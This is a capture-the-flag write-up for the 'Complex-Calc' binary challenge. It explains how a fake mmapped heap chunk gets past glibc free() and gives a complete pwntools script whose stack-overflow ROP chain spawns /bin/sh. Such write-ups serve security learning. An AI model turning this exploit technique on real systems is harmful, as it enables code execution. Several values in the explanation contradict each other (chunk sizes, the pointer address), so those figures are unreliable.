# Complex-Calc

This writeup is based off of this other writeup:

```
https://0xabe.io/ctf/exploit/2016/03/07/Boston-Key-Party-pwn-Complex-Calc.html
```

When we look at the binary, it appears to be similar to that of the previous challenge `Simple-Calc`. Let's see what is different using radiff2, which just runs a diff on the two binaries:

If you don't have it, radare2 can be found at `http://github.com/radare/radare2 `.
```
$	radiff2 complex-calc simple-calc 
0x000156e0 0f1f00660f1f44 => 4885ff0f84af00 0x000156e0
```

So we can see that there appears to be a difference. Let's see what it is:

```
$	objdump -D simple-calc -M intel | grep 156e0
  4156e0:	48 85 ff             	test   rdi,rdi
$	objdump -D complex-calc -M intel | grep 156e0
  4156e0:	0f 1f 00             	nop    DWORD PTR [rax]
```

So we can see that this deals with the `test` instruction that we relied on in `simple-calc` to simply pass a null value and have free return. It appears that it was patched over with a `NOP`, which will mean that the instruction will do nothing but execute the next line of assembly code. With objdump we can see that there were two lines of assembly code that were patched over with `NOP`:

Simple-Calc:
```
  4156e0:       48 85 ff                test   rdi,rdi
  4156e3:       0f 84 af 00 00 00       je     415798 <__cfree+0xc8>
``` 

Complex-Calc:
```
  4156e0:       0f 1f 00                nop    DWORD PTR [rax]
  4156e3:       66 0f 1f 44 00 00       nop    WORD PTR [rax+rax*1+0x0]
```

So this means that we will have to find a way to pass a false pointer to `free` that isn't null, and not cause a crash. Since this is the only difference between this binary and `Simple-Calc` we should be able to reuse the old exploit, once we figure out how to pass the free call. Luckily the source code for `free` is open source so we won't need to reverse it from the assembly code (you can find it in `malloc.c` from the glib library which you can download at `https://www.gnu.org/software/libc/`, or you can just view it in the browser at `https://code.woboq.org/userspace/glibc/malloc/malloc.c.html`).

# Reversing free

libc free source code:
```
  1 void
  2 __libc_free (void *mem)
  3 { 
  4   mstate ar_ptr;
  5   mchunkptr p;                          /* chunk corresponding to mem */
  6   void (*hook) (void *, const void *)
  7     = atomic_forced_read (__free_hook);
  8   if (__builtin_expect (hook != NULL, 0))
  9     { 
 10       (*hook)(mem, RETURN_ADDRESS (0));
 11       return;
 12     }
 13   if (mem == 0)                              /* free(0) has no effect */
 14     return;
 15   p = mem2chunk (mem); 
 16   if (chunk_is_mmapped (p))                       /* release mmapped memory. */
 17     { 
 18       /* See if the dynamic brk/mmap threshold needs adjusting.
 19          Dumped fake mmapped chunks do not affect the threshold.  */
 20       if (!mp_.no_dyn_threshold
 21           && chunksize_nomask (p) > mp_.mmap_threshold
 22           && chunksize_nomask (p) <= DEFAULT_MMAP_THRESHOLD_MAX
 23           && !DUMPED_MAIN_ARENA_CHUNK (p))
 24         {
 25           mp_.mmap_threshold = chunksize (p);
 26           mp_.trim_threshold = 2 * mp_.mmap_threshold;
 27           LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
 28                       mp_.mmap_threshold, mp_.trim_threshold);
 29         }
 30       munmap_chunk (p);
 31       return;
 32     }
 33   MAYBE_INIT_TCACHE ();
 34   ar_ptr = arena_for_chunk (p);
 35   _int_free (ar_ptr, p, 0);
 36 }
 37 libc_hidden_def (__libc_free)
```

Keep in mind that the line numbers for this code, are not the same as the line numbers found in `malloc.c`. Line 1 here is line 3090 in `malloc.c`.

Here we can see the source code for free. On line `13` we can see the check that we relied on in `Simple-Calc` which has been patched out since. We can also see that the return that we need to execute is on line `31`. We can see that with the first if then statment we need to pass on line `16`, it simply runs `mem2chunk` on the pointer it has been passed, which will return a chunk pointer, which will point to the header before the stored data.

```
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
```

```
/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */
#define IS_MMAPPED 0x2

/* check for mmap()'ed chunk */
#define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED)
```

We can see here that what `chunk_is_mmapped()` does is it takes the size from the header of the chunk pointer, and it returns the result of it anded with `0x2`. This will result in us passing the if then check if the second bit in the size is equal to one, which it should be. As for the second if then check, once we get past the first one and look at the code flow execution in gdb, we can see that it doesn't stop us from reaching the following checks, so for what we are doing we can ignore it. Now the next check will be in the `munmap_chunk()` function.

```
static void
internal_function
munmap_chunk (mchunkptr p)
{
  INTERNAL_SIZE_T size = chunksize (p);

  assert (chunk_is_mmapped (p));

  /* Do nothing if the chunk is a faked mmapped chunk in the dumped
     main arena.  We never free this memory.  */
  if (DUMPED_MAIN_ARENA_CHUNK (p))
    return;

  uintptr_t block = (uintptr_t) p - prev_size (p);
  size_t total_size = prev_size (p) + size;
  /* Unfortunately we have to do the compilers job by hand here.  Normally
     we would test BLOCK and TOTAL-SIZE separately for compliance with the
     page size.  But gcc does not recognize the optimization possibility
     (in the moment at least) so we combine the two values into one before
     the bit test.  */
  if (__builtin_expect (((block | total_size) & (GLRO (dl_pagesize) - 1)) != 0, 0))
    {
      malloc_printerr (check_action, "munmap_chunk(): invalid pointer",
                       chunk2mem (p), NULL);
      return;
    }

  atomic_decrement (&mp_.n_mmaps);
  atomic_add (&mp_.mmapped_mem, -total_size);

  /* If munmap failed the process virtual memory address space is in a
     bad shape.  Just leave the block hanging around, the process will
     terminate shortly anyway since not much can be done.  */
  __munmap ((char *) block, total_size);
}
```

Now to look at the pieces of this code that are important for what we are doing:

```
INTERNAL_SIZE_T size = chunksize (p);

[snippet]

#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)

/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p)         ((p)->mchunk_size)

[snippet]

#define NON_MAIN_ARENA 0x4

[snippet]

#define IS_MMAPPED 0x2

[snippet]

#define PREV_INUSE 0x1
```

Here we can see that size is equal to the argument ran through `chunksize`, which we can see OR's together 0x1, 0x2, and 0x4 which gives us 0x7 (equivalent to 00000111) then takes the binary not of it (now equivalent to 11111000) and ands it with the size of the chunk. Essentially what it is doing, is it is zeroing out the lowest three bits of the stored size (will be important later).

```
uintptr_t block = (uintptr_t) p - prev_size (p);
```

here we can see that `block` is equal to the chunk address (which points to the header) minus the size of the previous chunk
```
size_t total_size = prev_size (p) + size;
```

Here we can see that `total_size` is equal to the size of the previous chunk, plus the size of the current chunk

```
(GLRO (dl_pagesize) - 1) = 0xfff
```

This is a defined size as part of the standard for how big this should be (0x1000 - 1 = 0xfff). If you don't believe me, run `getpagesize()` in a C program to see for yourself.

Now `__builtin_expect()` essentially states that it expects the output to be zero, so it should fail the check (done to optimize the code).

Putting it all together, this is what the if then statment equates to:

```
(((adress - prev_size) | (prev_size + size)) & 0xfff) == 0
or simplified
((block | total_size) & 0xfff) == 0
```

Now remember, we want to fail this check. If this check passes, then the program crashes. So essentially with this check, we have to have the last three bytes be equal to 0x000, otherwise it won't be equal to 0 when the anding happens.


#Creating the Chunk

So in order to create the chunk, we need to first find an area of memory which we can write to, and know the adress of. We see that for each of the four operations, the first and second integer along with the result is stored in the bss segment with a static address. We can see that with the with the assembly code of the `adds` function:

scanf call to `add_input0`
```
   0x0000000000401095 <+19>:	mov    esi,0x6c4a80
   0x000000000040109a <+24>:	mov    edi,0x494214
   0x000000000040109f <+29>:	mov    eax,0x0
   0x00000000004010a4 <+34>:	call   0x4084c0 <__isoc99_scanf>
```

scanf call to `add_input1`
```
   0x00000000004010c2 <+64>:	mov    esi,0x6c4a84
   0x00000000004010c7 <+69>:	mov    edi,0x494214
   0x00000000004010cc <+74>:	mov    eax,0x0
   0x00000000004010d1 <+79>:	call   0x4084c0 <__isoc99_scanf>
```

adding to the two together and storing them in `add_result`
```
   0x000000000040110a <+136>:	mov    edx,DWORD PTR [rip+0x2c3970]        # 0x6c4a80 <add>
   0x0000000000401110 <+142>:	mov    eax,DWORD PTR [rip+0x2c396e]        # 0x6c4a84 <add+4>
   0x0000000000401116 <+148>:	add    eax,edx
   0x0000000000401118 <+150>:	mov    DWORD PTR [rip+0x2c396a],eax        # 0x6c4a88 <add+8>
```

and when we look at the corresponding addresses:

```
.bss:00000000006C4A80                 public add_input_0
.bss:00000000006C4A80 add_input_0     dd ?                    ; DATA XREF: adds+13o
.bss:00000000006C4A80                                         ; adds+5Er ...
.bss:00000000006C4A84 add_input_1     dd ?                    ; DATA XREF: adds+40o
.bss:00000000006C4A84                                         ; adds+69r ...
.bss:00000000006C4A88 add_result      dd ?                    ; DATA XREF: adds+96w
.bss:00000000006C4A88                                         ; adds+9Cr ...
```

Keep in mind that each of the three componets is stored as a four byte int. So we control 12 bytes worth of data at a static address. With that, our input will be stored like this:

```
0x6C4A80:	| add_input0	:	add_input1 	|
0x6C4A88:	| add_result	:	data		| 
0x6C4A90:	| data			:	data 		|
```

Now for the varous `data` pieces, we won't have any control over those. Now the pointer we will pass to free will be `0x6c4a90`, since then the pieces of data that we control will be used in the final if then check that we need to pass. Now for that check, remember that only the lower bits are being checked, which because of least endian is stored first, so only `add_input0` and `add_result` are being checked. 

```
0x6C4A80:	| prev_size_lower_bits	:	prev_size_higher_bits	|
0x6C4A88:	| size_lower_bits		:	size_higher_bits		|
0x6C4A90:	| data					:	data			 		|
```

Now we need to have the lower three bytes of `block` and `total_size` be zero. To do this:
```
block = chunk_pointer - prev_size
block = 0x6c4a80 - prev_size
in order for block to end  in 0x000, prev_size must be 0xa80
```

now for `total_size`:

```
total_size = prev_size + size
total_size should = 0x1000
prev_size = 0xab0 from previous snippet
0x1000 - 0xa80 = 0x580
in order for total_size to end in 0x000, size must = 0x580
```



Remember in order to pass the first check, the second lowest bit of `toatal_size` must be set, meaning that we must set `total_size` equal to `0x552`. However this bit is removed when `chunksize` is ran, so we don't need to worry about it with what we've done so far. Now that we know what `add_input0` and `add_result` should be, we can figure out what `add_input1` has to be:

```
0xa80 + add_input1 = 0x582
add_input1 = 0x582 - 0xa80
add_input1 = -0x4fe
```

So we know what the inputs we have to give the `adds` function are to make to fake chunk. Keep in mind that in order for our input to be read properly by `free`, the pointer we must give it is `0x6c4ac0`.  We can see that in gdb.

```
   0x4156e9 <free+25>:	mov    rax,QWORD PTR [rdi-0x8]
   0x4156ed <free+29>:	lea    rsi,[rdi-0x10]
   => 0x4156f1 <free+33>:	test   al,0x2
   0x4156f3 <free+35>:	jne    0x415718 <free+72>
```

and when we see what is at those locations:
```
gdb-peda$ p $rdi
$9 = 0x6c4ac0
gdb-peda$ p $rdi-0x8
$10 = 0x6c4ab8
gdb-peda$ p $rdi-0x10
$11 = 0x6c4ab0
```

Keep in mind the same thing (with different inputs, of course) would work with the `subs` function. In the writeup that this writeup is based off of, they use `subs` instead of `adds`.

#Exploit

So now that we know how to pass a false pointer to `free` and not have the program crash, we can just reuse the same ROP Chain and exploit from `simple-calc`. Here is a high level overview of what our exploit will look like:

```
48 bytes of 0x0
address of false pointer which will be passed to free, 0x6c4a90
20 more bytes of 0x0 to reach the return address
ROP Chain
```

Of course, before we exit we will need to use the `adds` function to write the needed values into the `bss` segment, so the false pointer we pass to `free` will have the data it needs to pass it. With that, we can write our exploit (this one is cleaner than the one I wrote for `simple-calculator`):

```
#Import pwntools
from pwn import *

#Start the target process, attach gd
target = process('./complex-calc')
#gdb.attach(target, gdbscript = 'b *0x401551\nb *0x401556')

#Declare the ROP Gadgets
pop_rdi = 0x401b73
pop_rsi = 0x401c87
pop_rax = 0x44db34
pop_rdx = 0x437a85
write_gadget = 0x44526e

#Declare the other things which will be used in the ROP Chain
syscall = 0x400488
binsh0 = 0x6e69622f
binsh1 = 0x0068732f
space = 0x6c0000

#Declare the start function, which will just establish how many operations we will use
def start():
	target.sendline("50")
	target.recvuntil("=>")

#Declare the first function which will write values that we pass to it
def write(arg):
	x = arg - 100
	target.sendline("1")
	target.sendline(str(x))
	target.sendline("100")	
	target.recvuntil("=>")

#This is essentially the write function, however it writes 0x0000 after everything (helps format 8 byte segments)
def rop_write(arg):
	x = arg - 100
	target.sendline("1")
	target.sendline(str(x))
	target.sendline("100")	
	target.recvuntil("=>")
	write(0x0)

#This is just a function to recursively write 0x0000 to fill up space
def write_zeros(arg):
	for i in range(0, arg):
		write(0x0)

#This function just writes the rop Chain
def write_rop_chain():
	#Write the part of the ROP Chain to write "/bin/sh" to memory
	rop_write(pop_rax)
	rop_write(space)
	rop_write(pop_rdx)
	write(binsh0)
	write(binsh1)
	rop_write(write_gadget)

	#Make the syscall to get a shell
	rop_write(pop_rdi)
	rop_write(space)
	rop_write(pop_rdx)
	write(0x0)
	write(0x0)
	rop_write(pop_rsi)
	write(0x0)
	write(0x0)
	rop_write(pop_rax)
	rop_write(0x3b)
	rop_write(syscall)

#This function just adds the two integers together that we need in order to not crash free, than saves and exits the program to trigger the bug
def end():

	target.sendline("1")
	target.sendline("2688")
	target.sendline("-1278")
	target.recvuntil("=>")
	target.sendline("5")

#calling the functions to run the exploit
start()
write_zeros(12)
write(0x6c4a90)
write_zeros(5)
write_rop_chain()
end()

#Drop to an interactive shell
target.interactive()
```

and when we run the exploit:

```
$	python exploit.py 
[+] Starting local process './complex-calc': pid 10403
[*] Switching to interactive mode
 $ ls
1                      old.py
2                      peda-session-complex-calc.txt
complex-calc                  peda-session-w.procps.txt
core                      readme.md
d60001db1a24eca410c5d102410c3311d34d832c  simple-calc
exploit.py                  try.py
notes
$ w
 15:39:13 up  3:04,  1 user,  load average: 0.61, 0.47, 0.45
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               12:35    3:04m  2:00   0.04s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
```

Just like that, we popped a shell!
